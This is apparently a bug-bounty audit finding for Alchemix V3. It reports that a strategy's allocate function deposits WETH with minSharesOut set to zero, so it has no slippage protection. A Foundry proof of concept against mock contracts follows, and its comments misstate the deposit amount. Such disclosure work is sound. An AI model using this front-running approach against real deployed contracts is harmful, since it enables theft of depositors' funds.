# 58398 sc high no slippage protection on large allocation deposits

**Submitted on Nov 1st 2025 at 23:58:10 UTC by @PotEater for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58398
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoEth.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The function `allocate` deposits WETH into the `autoEth` vault using the router `depositMax` function. However, the function is missing a slippage protection as it sets `minSharesOut` parameter to zero.

This disables all slippage protection and allows the transaction to succeed even if the vault returns far fewer shares than expected.

## Vulnerability Details

The function `allocate` sets the `minSharesOut` parameter to zero, not allowing the caller to specify minimum slippage.

Code snippet:

```solidity
uint256 shares = router.depositMax(autoEth, address(this), 0); // no slippage protection
```

Given that allocations are performed with large amounts of user funds, this missing safeguard presents a significant risk.

## Impact Details

The impact is loss of funds, because malicious actors may exploit this and front-run transactions, extracting value from allocations because nothing reverts the transaction when less shares is received. This results in permanent loss of funds due to receiving fewer vault shares than expected.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/strategies/mainnet/TokeAutoEth.sol#L59>

## Proof of Concept

## Proof of Concept

Paste this code in path `src/test/strategies/PoC.t.sol`.

Run with `forge test --match-test test_noSlippageLoss`

PoC:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IAutopilotRouter {
    function depositMax(address vault, address to, uint256 minSharesOut) external returns (uint256 shares);
}

interface IAutoVault {
    function asset() external view returns (address);
    function convertToShares(uint256 assets) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

/* --------------------------------------------------------------------------
   MockVault
   - Uses a manipulable pricePerShare to simulate price manipulation
   - convertToShares(assets) = assets * 1e18 / pricePerShare
   - When pricePerShare increases, depositor receives fewer shares for the same assets
   --------------------------------------------------------------------------- */
contract MockVault is IAutoVault {
    IERC20 public immutable assetToken;
    uint256 public totalAssetsStored;
    uint256 public totalShares;
    uint256 public pricePerShare;

    event Deposited(address indexed receiver, uint256 assets, uint256 sharesOut);
    event PriceUpdated(uint256 oldPrice, uint256 newPrice);

    constructor(address _asset) {
        assetToken = IERC20(_asset);
        pricePerShare = 1e18;
    }

    function asset() external view override returns (address) {
        return address(assetToken);
    }

    function convertToShares(uint256 assets) public view override returns (uint256) {
        // shares = assets * 1e18 / pricePerShare
        // if pricePerShare > 1e18 depositor receives fewer shares
        if (pricePerShare == 0) return assets;
        return (assets * 1e18) / pricePerShare;
    }

    function totalAssets() external view override returns (uint256) {
        return totalAssetsStored;
    }

    function totalSupply() external view override returns (uint256) {
        return totalShares;
    }

    function deposit(uint256 assets, address receiver) external override returns (uint256 sharesOut) {
        // transferFrom caller -> vault
        require(assetToken.transferFrom(msg.sender, address(this), assets), "transferFrom failed");
        sharesOut = convertToShares(assets);
        totalAssetsStored += assets;
        totalShares += sharesOut;
        emit Deposited(receiver, assets, sharesOut);
    }

    function setPricePerShare(uint256 newPrice) external {
        uint256 old = pricePerShare;
        pricePerShare = newPrice;
        emit PriceUpdated(old, newPrice);
    }
}

/* --------------------------------------------------------------------------
   MockRouter
   - Simplified router that transfers user's entire approved balance (or full balance)
   - Calls vault.deposit(...) and enforces minSharesOut check (so it behaves like a real router)
   - For this PoC we will call it with minSharesOut = 0 to show missing protection in strategy
   --------------------------------------------------------------------------- */
contract MockRouter {
    function depositMax(address vault, address to, uint256 minSharesOut) external returns (uint256 sharesOut) {
        IAutoVault v = IAutoVault(vault);
        IERC20 token = IERC20(v.asset());

        uint256 bal = token.balanceOf(msg.sender); // user's current token balance
        // Transfer the full balance from user to router
        require(token.transferFrom(msg.sender, address(this), bal), "transferFrom to router failed");

        // approve vault & deposit
        require(token.approve(address(v), bal), "approve failed");
        sharesOut = v.deposit(bal, to);

        // Enforce minSharesOut (this would revert if minSharesOut > sharesOut)
        require(sharesOut >= minSharesOut, "Slippage protection triggered");
    }
}

contract MinimalERC20 is IERC20 {
    string public constant name = "MockWETH";
    string public constant symbol = "MWETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(balanceOf[from] >= amount, "insufficient-from");
        require(allowance[from][msg.sender] >= amount, "allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/* --------------------------------------------------------------------------
   PoC Test
   - show an attacker manipulates pricePerShare upward -> depositor gets fewer shares
   - router.depositMax(..., minSharesOut = 0) still succeeds, causing loss
   --------------------------------------------------------------------------- */
contract PoC_NoSlippage_Allocate is Test {
    MinimalERC20 public weth;
    MockVault public vault;
    MockRouter public router;

    address public user = address(0xBEEF);
    address public attacker = address(0xBAD);

    function setUp() public {
        weth = new MinimalERC20();
        vault = new MockVault(address(weth));
        router = new MockRouter();

        // Mint balances for user & attacker
        weth.mint(user, 100 ether);
        weth.mint(attacker, 100 ether);
    }

    function test_noSlippageLoss() public {
        // STEP 1: User sets up normal 1:1 price and deposits a small amount to establish state
        vm.startPrank(user);
        weth.approve(address(vault), 10 ether);
        vault.deposit(10 ether, user); // deposit 10 assets -> at pricePerShare=1e18 => ~10 shares
        vm.stopPrank();

        uint256 sharesPer1Before = vault.convertToShares(1 ether);
        emit log_named_uint("convertToShares(1) before manipulation", sharesPer1Before);
        assertEq(sharesPer1Before, 1 ether, "initial rate should be ~1:1");

        // STEP 2: Attacker manipulates pricePerShare (increases it), making future deposits receive fewer shares
        vm.startPrank(attacker);
        // attacker could do many actions; for PoC we directly set price (mock vault has helper)
        vault.setPricePerShare(5e18); // pricePerShare = 5 -> depositor gets 1/5 shares per asset
        vm.stopPrank();

        uint256 sharesPer1After = vault.convertToShares(1 ether);
        emit log_named_uint("convertToShares(1) after manipulation", sharesPer1After);
        // sharesPer1After should be smaller than before (1e18 / 5e18 = 0.2e18)
        assertLt(sharesPer1After, sharesPer1Before, "price manipulation should reduce shares per asset");

        // STEP 3: User allocates large amount via router but strategy uses minSharesOut = 0 (we emulate that by calling router.depositMax(..., 0))
        vm.startPrank(user);
        // ensure router can pull entire remaining balance: approve large amount
        weth.approve(address(router), type(uint256).max);
        uint256 userBalanceBefore = weth.balanceOf(user);
        emit log_named_uint("user WETH balance before deposit", userBalanceBefore);

        // User deposits 50 WETH via router with minSharesOut = 0 (no slippage protection)
        uint256 sharesReceived = router.depositMax(address(vault), user, 0);
        vm.stopPrank();

        emit log_named_uint("Shares received (no protection)", sharesReceived);

        // STEP 4: Expected shares under original 1:1 rate (for comparison)
        // Note: original expected = 50 * 1e18 / 1e18 = 50 shares
        uint256 expectedSharesAt1to1 = (50 ether * 1e18) / 1e18;
        emit log_named_uint("Expected shares at 1:1", expectedSharesAt1to1);

        // Under manipulated price (pricePerShare = 5e18) expected would be ~10 shares (50 * 1e18 / 5e18)
        uint256 expectedAfterManip = vault.convertToShares(50 ether);
        emit log_named_uint("Expected shares at manipulated price", expectedAfterManip);

        // ASSERT: sharesReceived is strictly less than expected at 1:1 (i.e., user lost value)
        assertLt(sharesReceived, expectedSharesAt1to1, "User should have received fewer shares than expected at 1:1");
    }
}
```

Result:

```solidity
[PASS] test_noSlippageLoss() (gas: 200616)
Logs:
  convertToShares(1) before manipulation: 1000000000000000000
  convertToShares(1) after manipulation: 200000000000000000
  user WETH balance before deposit: 90000000000000000000
  Shares received (no protection): 18000000000000000000
  Expected shares at 1:1: 50000000000000000000
  Expected shares at manipulated price: 10000000000000000000

Suite result: ok. 1 passed; 0 failed;
```
